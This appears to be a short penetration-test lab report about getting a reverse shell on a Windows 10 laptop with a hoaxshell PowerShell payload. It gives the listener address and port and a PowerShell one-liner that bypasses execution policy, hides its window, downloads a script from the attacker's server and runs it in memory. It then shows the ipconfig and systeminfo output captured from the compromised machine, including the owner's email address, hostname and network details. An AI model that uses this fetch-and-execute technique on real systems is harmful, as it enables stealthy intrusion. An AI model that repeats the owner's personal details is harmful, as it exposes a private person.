- Payload: `windows/hoaxshell/powershell_iex lhost=10.121.224.85`
- LHOST:10.121.224.85
- LPORT:443
- The payload was executed on the target VM by hosting a PowerShell reverse shell script on a server (e.g., using a Python simple HTTP server on the attacker's Kali machine). The attacker then ran a PowerShell command on the Windows target VM that set the execution policy to bypass, downloaded the script from the attacker’s IP, and executed it. This established a reverse TCP connection back to the attacker’s machine, opening an interactive shell session.Example command used on the target VM to start the reverse shell:powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:<PORT>/reverse.ps1')".Here, <LHOST> and <PORT> are replaced by the attacker’s IP and listening port. This command downloads and runs the PowerShell script in memory without writing it to disk, providing stealthy access to the attacker. The Metasploit or Netcat listener on the attacker side captures the incoming connection and provides shell control.

- Hostname:venug
- IP Address:10.121.224.177
- User:venug
```
laptop-iqpubtjb\venug
Windows IP Configuration
                                                                                       
                                                                                       
Ethernet adapter Ethernet 2:                                                           
                                                                                       
   Media State . . . . . . . . . . . : Media disconnected                              
   Connection-specific DNS Suffix  . :                                                 
                                                                                       
Ethernet adapter Ethernet:                                                             
                                                                                       
   Connection-specific DNS Suffix  . :                                                 
   Link-local IPv6 Address . . . . . : fe80::cefb:f403:9771:5d35%10                    
   IPv4 Address. . . . . . . . . . . : 192.168.56.1                                    
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                   
   Default Gateway . . . . . . . . . :                                                 
                                                                                       
Wireless LAN adapter Local Area Connection* 1:                                         
                                                                                       
   Media State . . . . . . . . . . . : Media disconnected                              
   Connection-specific DNS Suffix  . :                                                 
                                                                                       
Wireless LAN adapter Local Area Connection* 2:                                         
                                                                                       
   Media State . . . . . . . . . . . : Media disconnected                              
   Connection-specific DNS Suffix  . :                                                 
                                                                                       
Wireless LAN adapter Wi-Fi:                                                            
                                                                                       
   Connection-specific DNS Suffix  . :                                                 
   IPv6 Address. . . . . . . . . . . : 2401:4900:9398:e158:f63c:f56c:c777:3d60         
   Temporary IPv6 Address. . . . . . : 2401:4900:9398:e158:e92d:4942:fc69:5761         
   Link-local IPv6 Address . . . . . : fe80::c65d:ebdc:e61a:888c%13                    
   IPv4 Address. . . . . . . . . . . : 10.121.224.177                                  
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                   
   Default Gateway . . . . . . . . . : fe80::ac3b:a2ff:fefa:7db%13                     
                                       10.121.224.64                                   
                                                                                       
Ethernet adapter Bluetooth Network Connection:                                         
                                                                                       
   Media State . . . . . . . . . . . : Media disconnected                              
   Connection-specific DNS Suffix  . :  

LAPTOP-IQPUBTJB\venug> systeminfo
Host Name:                 LAPTOP-IQPUBTJB
OS Name:                   Microsoft Windows 10 Home Single Language                   
OS Version:                10.0.19045 N/A Build 19045                                  
OS Manufacturer:           Microsoft Corporation                                       
OS Configuration:          Standalone Workstation                                      
OS Build Type:             Multiprocessor Free                                         
Registered Owner:          venugopal.sreekrishnapuram@gmail.com                        
Registered Organization:   HP                                                          
Product ID:                00327-36278-32607-AAOEM                                     
Original Install Date:     19-06-2021, 02:10:04                                        
System Boot Time:          29-07-2025, 15:55:21                                        
System Manufacturer:       HP                                                          
System Model:              HP Laptop 14s-fq1xxx                                        
System Type:               x64-based PC                                                
Processor(s):              1 Processor(s) Installed.                                   
                           [01]: AMD64 Family 23 Model 104 Stepping 1 AuthenticAMD ~2100 Mhz                                                                                  
BIOS Version:              AMI F.15, 17-08-2021                                        
Windows Directory:         C:\windows                                                  
System Directory:          C:\windows\system32                                         
Boot Device:               \Device\HarddiskVolume1                                     
System Locale:             en-us;English (United States)                               
Input Locale:              00004009                                                    
Time Zone:                 (UTC+05:30) Chennai, Kolkata, Mumbai, New Delhi             
Total Physical Memory:     7,521 MB                                                    
Available Physical Memory: 673 MB                                                      
Virtual Memory: Max Size:  16,287 MB                                                   
Virtual Memory: Available: 2,145 MB                                                    
Virtual Memory: In Use:    14,142 MB                                                   
Page File Location(s):     C:\pagefile.sys                                             
Domain:                    WORKGROUP                                                   
Logon Server:              \\LAPTOP-IQPUBTJB                                           
Hotfix(s):                 54 Hotfix(s) Installed.                                     
                           [01]: KB5056578                                             
                           [02]: KB5027122                                             
                           [03]: KB4534170                                             
                           [04]: KB4537759                                             
                           [05]: KB4545706                                             
                           [06]: KB4562830                                             
                           [07]: KB4577586                                             
                           [08]: KB4580325                                             
                           [09]: KB4586864                                             
                           [10]: KB5003791                                             
                           [11]: KB5011048                                             
                           [12]: KB5012170                                             
                           [13]: KB5015684                                             
                           [14]: KB5008575                                             
                           [15]: KB5063709                                             
                           [16]: KB5006753                                             
                           [17]: KB5007273                                             
                           [18]: KB5011352                                             
                           [19]: KB5011651                                             
                           [20]: KB5014032                                             
                           [21]: KB5014035                                             
                           [22]: KB5014671                                             
                           [23]: KB5015895                                             
                           [24]: KB5016705                                             
                           [25]: KB5020372                                             
                           [26]: KB5025315                                             
                           [27]: KB5026879                                             
                           [28]: KB5028380                                             
                           [29]: KB5029709                                             
                           [30]: KB5031539                                             
                           [31]: KB5032392                                             
                           [32]: KB5032907                                             
                           [33]: KB5034224                                             
                           [34]: KB5035225                                             
                           [35]: KB5036447                                             
                           [36]: KB5037018                                             
                           [37]: KB5037240                                             
                           [38]: KB5037995                                             
                           [39]: KB5039336                                             
                           [40]: KB5040565                                             
                           [41]: KB5041579                                             
                           [42]: KB5041581                                             
                           [43]: KB5043935                                             
                           [44]: KB5043130                                             
                           [45]: KB5046823                                             
                           [46]: KB5050388                                             
                           [47]: KB5050111                                             
                           [48]: KB5052916                                             
                           [49]: KB5054682                                             
                           [50]: KB5058526                                             
                           [51]: KB5059504                                             
                           [52]: KB5063706                                             
                           [53]: KB5063261                                             
                           [54]: KB5005699                                             
Network Card(s):           4 NIC(s) Installed.                                         
                           [01]: Bluetooth Device (Personal Area Network)              
                                 Connection Name: Bluetooth Network Connection         
                                 Status:          Media disconnected                   
                           [02]: VirtualBox Host-Only Ethernet Adapter                 
                                 Connection Name: Ethernet                             
                                 DHCP Enabled:    No                                   
                                 IP address(es)                                        
                                 [01]: 192.168.56.1                                    
                                 [02]: fe80::cefb:f403:9771:5d35                       
                           [03]: Realtek RTL8821CE 802.11ac PCIe Adapter               
                                 Connection Name: Wi-Fi                                
                                 DHCP Enabled:    Yes                                  
                                 DHCP Server:     10.121.224.64                        
                                 IP address(es)                                        
                                 [01]: 10.121.224.177                                  
                                 [02]: fe80::c65d:ebdc:e61a:888c                       
                                 [03]: 2401:4900:9398:e158:e92d:4942:fc69:5761         
                                 [04]: 2401:4900:9398:e158:f63c:f56c:c777:3d60         
                           [04]: ExpressVPN TAP Adapter                                
                                 Connection Name: Ethernet 2                           
                                 Status:          Media disconnected                   
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.           
```
                            
 
